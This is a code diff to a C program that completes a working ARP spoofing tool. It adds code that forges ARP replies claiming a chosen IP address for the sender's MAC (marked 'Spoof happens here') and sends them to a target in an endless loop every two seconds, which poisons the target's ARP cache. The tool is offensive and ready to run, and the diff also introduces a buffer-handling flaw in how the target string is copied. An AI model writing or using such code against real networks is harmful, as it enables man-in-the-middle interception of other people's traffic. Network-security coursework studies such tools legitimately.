@@ -117,13 +117,15 @@ unsigned char *build_reply(char *interface, char *target, char *host) {
 	struct arp_header *arp;
 	unsigned char *packet = (unsigned char *)calloc(sizeof(struct arp_header) + sizeof(struct eth_header), 1);
 
-
-   struct sockaddr_in *ip_addr;
    struct in_addr addr;
-   char target_mac[18];
-   char src_ip[4];
-   char *src_ip_str;
+   struct in_addr addr2;
+	char target_mac[18];
+	char *target_str = (char *)calloc(15, 1);
 
+	if(strncpy(target_str, target, strlen(target)) == 0) {
+		fprintf(stderr, "strncpy error\n");
+		exit(EXIT_FAILURE);
+	}
 	
 	/* Create a datagram socket to find interface IP */
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
@@ -141,15 +143,6 @@ unsigned char *build_reply(char *interface, char *target, char *host) {
       SIOCSIFADDR sets an interface addr
       SIOCGHWADDR gets locak HW addr
     */
-   if (ioctl(sockfd, SIOCGIFADDR, (char *)&ifr) <  0) {
-      perror("icotl");
-      exit(EXIT_SUCCESS);
-   }
-
-   ip_addr = (struct sockaddr_in*)&ifr.ifr_addr;
-   memcpy(src_ip, &ip_addr->sin_addr, 4);
-   src_ip_str = inet_ntoa(ip_addr->sin_addr);
-
    if (ioctl(sockfd, SIOCGIFHWADDR, (char *)&ifr) < 0) {
       perror("ioctl");
       exit(EXIT_SUCCESS);
@@ -166,41 +159,55 @@ unsigned char *build_reply(char *interface, char *target, char *host) {
    }
 
    /* Search for the arp entry containing our target ip */
-	strcat(target, " ");
+	strcat(target_str, " ");
 	while (fgets(strbuf, 256, fp) != NULL) {
-		if (strstr(strbuf, target) != 0) {
+		if (strstr(strbuf, target_str) != 0) {
          /* Parse out fields */
          strncpy(target_mac, strstr(strbuf, ":")-2, 18);
 			break;
       }
    }
-	target[strlen(target)-1] = 0;
+	target_str[strlen(target_str)-1] = 0;
 	
-	if(!inet_pton(AF_INET, target, &addr)) {
+	if(!inet_pton(AF_INET, target_str, &addr)) {
       fprintf(stderr, "Error converting IP Address\n");
       exit(EXIT_FAILURE);
    }
 
+	if(!inet_pton(AF_INET, host, &addr2)) {
+      fprintf(stderr, "Error converting IP Address\n");
+      exit(EXIT_FAILURE);
+	}
+
 	eth = (struct eth_header *)packet;
 	arp = (struct arp_header *)(packet + sizeof(struct eth_header));
+	
+	/* Build eth header */
+	memcpy((void *)&eth->dmac, formatConvertMac(target_mac), 6);
+	memcpy((void *)&eth->smac, ifr.ifr_hwaddr.sa_data, 6);
+	eth->type = htons(ETH_TYPE); 
 
-
-   /*
-   memcpy(args->dip,  &addr.s_addr,  4);
-   memcpy(args->sip,  src_ip, 4);
-   memcpy(args->dmac, formatConvertMac(target_mac), 6);
-   memcpy(args->smac, ifr.ifr_hwaddr.sa_data, 6);
-	*/
+	/* Build arp header */
+	arp->htype = htons(HTYPE);
+	arp->ptype = htons(PTYPE);
+	arp->hlen  = HLEN;
+	arp->plen  = PLEN;
+   arp->oper  = htons(ARP_REPLY);
+	memcpy((void *)&arp->smac, ifr.ifr_hwaddr.sa_data, 6);
+	/* Spoof happens here */
+	memcpy((void *)&arp->sip, &addr2.s_addr, 4);
+	memcpy((void *)&arp->dmac, formatConvertMac(target_mac), 6);
+	memcpy((void *)&arp->dip, &addr.s_addr, 4);			
 
 	if(DEBUG) {
       printf("Target Mac: %.14s\n", target_mac);
       printf("Source Mac: ");
       print_mac((unsigned char *)ifr.ifr_hwaddr.sa_data);
-      printf("Network address: %s\n", src_ip_str);
-      printf("Target address: %s\n\n", target);
+      printf("Network address: %s\n", host);
+      printf("Target address: %s\n\n", target_str);
    }
 
-	return 0;
+	return packet;
 }
 
 int send_ping(char *target) {
@@ -234,15 +241,17 @@ int send_arp(unsigned char *packet, char *interface) {
       exit(EXIT_FAILURE);
    }
 
-   if (DEBUG) {
-      print_buf((unsigned char *)packet, sizeof(struct eth_header) + sizeof(struct arp_header));
-   }
-
    strcpy(sa.sa_data, interface);
-   if(sendto(sockfd, packet, sizeof(struct eth_header) + sizeof(struct arp_header), 0, &sa, sizeof(sa)) < 0) {
-      perror("Error sending packet");
-      exit(EXIT_FAILURE);
-   }
+	while(1) {
+    
+	  	print_buf((unsigned char *)packet, sizeof(struct eth_header) + sizeof(struct arp_header));
+	
+		if(sendto(sockfd, packet, sizeof(struct eth_header) + sizeof(struct arp_header), 0, &sa, sizeof(sa)) < 0) {
+      	perror("Error sending packet");
+      	exit(EXIT_FAILURE);
+   	}
+		sleep(2);
+	}	
 
 		
 	return 0;
